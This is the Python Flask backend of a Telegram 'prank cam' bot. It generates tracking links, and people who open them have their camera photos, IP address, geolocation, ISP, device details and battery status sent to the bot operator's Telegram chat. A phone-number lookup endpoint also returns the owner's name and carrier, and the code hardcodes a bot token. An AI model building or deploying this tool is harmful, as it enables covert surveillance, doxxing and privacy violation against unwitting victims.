from flask import Flask, request, jsonify
import requests
import base64
from io import BytesIO
import uuid
import os

app = Flask(__name__)

TOKEN = "8759505136:AAGAVvvts52UJcto01hnAJsv8B4U_1y7orU"
WEB_APP_BASE_URL = "https://prank-cam-bot.vercel.app"


@app.route("/", methods=["GET"])
def home():
    return "OK"


@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json()

    if not update or "message" not in update:
        return jsonify({"ok": True})

    chat_id = update["message"]["chat"]["id"]
    text = update["message"].get("text", "").lower()

    if text == "/start":
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
            "chat_id": chat_id,
            "text": "📸 Camera Bot Ready!\nUse /generate"
        })

    elif text == "/generate":
        uid = str(uuid.uuid4())[:8]
        link = f"{WEB_APP_BASE_URL}/?chat_id={chat_id}&id={uid}"

        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
            "chat_id": chat_id,
            "text": f"Open link:\n{link}"
        })

    return jsonify({"ok": True})


@app.route("/send-photo", methods=["POST"])
def send_photo():
    data = request.get_json()

    chat_id = data.get("chat_id")
    photo = data.get("photo")
    number = data.get("number", "")

    if not chat_id or not photo:
        return jsonify({"error": "missing"}), 400

    header, imgstr = photo.split(",", 1)
    img_bytes = base64.b64decode(imgstr)

    requests.post(
        f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
        data={
            "chat_id": chat_id,
            "caption": f"📸 {number}"
        },
        files={"photo": ("img.jpg", BytesIO(img_bytes))}
    )

    return jsonify({"ok": True})

@app.route("/number", methods=["POST"])
def number():
    data = request.json

    chat_id = data.get("chat_id")
    number = data.get("number")

    # 🔥 API CALL (SERVER SIDE)
    try:
        res = requests.get(f"https://number-info-bd-tau.vercel.app/info?number={number}")
        api = res.json()
    except:
        api = {"error": "API failed"}

    # 🔥 CLEAN FORMAT (better than raw JSON)
    info = api.get("result", {})

    text = f"""
📱 PHONE SEARCH

Number: {number}

Name: {info.get("name", "N/A")}
Country: {info.get("country", "N/A")}
Carrier: {info.get("carrier", "N/A")}
"""

    requests.post(
        f"https://api.telegram.org/bot{TOKEN}/sendMessage",
        json={
            "chat_id": chat_id,
            "text": text
        }
    )

    return {"ok": True}

@app.route("/visitor", methods=["POST"])
def visitor():
    data = request.get_json()

    chat_id = data.get("chat_id")
    device = data.get("device", {})

    ip = request.headers.get('x-forwarded-for', request.remote_addr)

    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
    except:
        res = {}

    msg = f"""
🌐 VISITOR INFO

IP: {ip}

Location: {res.get('country')} - {res.get('city')}
ISP: {res.get('isp')}

Device: {device.get('userAgent')}
Platform: {device.get('platform')}
Screen: {device.get('screen')}
Language: {device.get('language')}

Time: {device.get('time')}
Timezone: {device.get('timezone')}

Battery: {device.get('battery')}
"""

    requests.post(
        f"https://api.telegram.org/bot{TOKEN}/sendMessage",
        json={"chat_id": chat_id, "text": msg}
    )

    return jsonify({"ok": True})


app = app
